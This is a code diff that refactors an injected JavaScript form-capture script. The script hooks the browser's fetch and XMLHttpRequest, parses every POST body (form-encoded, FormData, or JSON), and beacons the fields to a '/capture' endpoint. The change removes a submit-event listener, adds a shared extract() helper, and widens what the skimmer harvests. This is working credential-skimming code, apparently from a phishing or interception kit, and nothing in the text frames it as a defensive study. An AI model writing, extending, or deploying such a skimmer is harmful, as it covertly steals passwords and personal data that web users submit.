@@ -19,19 +19,21 @@ const captureScript = `(function(){
       else{fetch('/capture',{method:'POST',body:p,keepalive:true});}
     }catch(e){}
   }
-  document.addEventListener('submit',function(e){
-    try{var fd=new FormData(e.target),o={};fd.forEach(function(v,k){o[k]=v;});beacon(o);}catch(e){}
-  },true);
+  function extract(b){
+    var o={};
+    if(b instanceof URLSearchParams){b.forEach(function(v,k){o[k]=v;});}
+    else if(b instanceof FormData){b.forEach(function(v,k){if(typeof v==='string')o[k]=v;});}
+    else if(typeof b==='string'){
+      try{var j=JSON.parse(b);if(j&&typeof j==='object')o=j;}
+      catch(_){new URLSearchParams(b).forEach(function(v,k){o[k]=v;});}
+    }
+    return o;
+  }
   var _f=window.fetch;
   window.fetch=function(url,opts){
     try{
       if(opts&&/post/i.test(opts.method||'')&&opts.body){
-        var b=opts.body,o={};
-        if(b instanceof URLSearchParams){b.forEach(function(v,k){o[k]=v;});}
-        else if(typeof b==='string'){
-          try{var j=JSON.parse(b);if(j&&typeof j==='object')o=j;}
-          catch(_){new URLSearchParams(b).forEach(function(v,k){o[k]=v;});}
-        }
+        var o=extract(opts.body);
         if(Object.keys(o).length)beacon(o);
       }
     }catch(e){}
@@ -42,11 +44,7 @@ const captureScript = `(function(){
   XMLHttpRequest.prototype.send=function(b){
     try{
       if(/post/i.test(this._csm||'')&&b){
-        var o={};
-        if(typeof b==='string'){
-          try{var j=JSON.parse(b);if(j&&typeof j==='object')o=j;}
-          catch(_){new URLSearchParams(b).forEach(function(v,k){o[k]=v;});}
-        }
+        var o=extract(b);
         if(Object.keys(o).length)beacon(o);
       }
     }catch(e){}
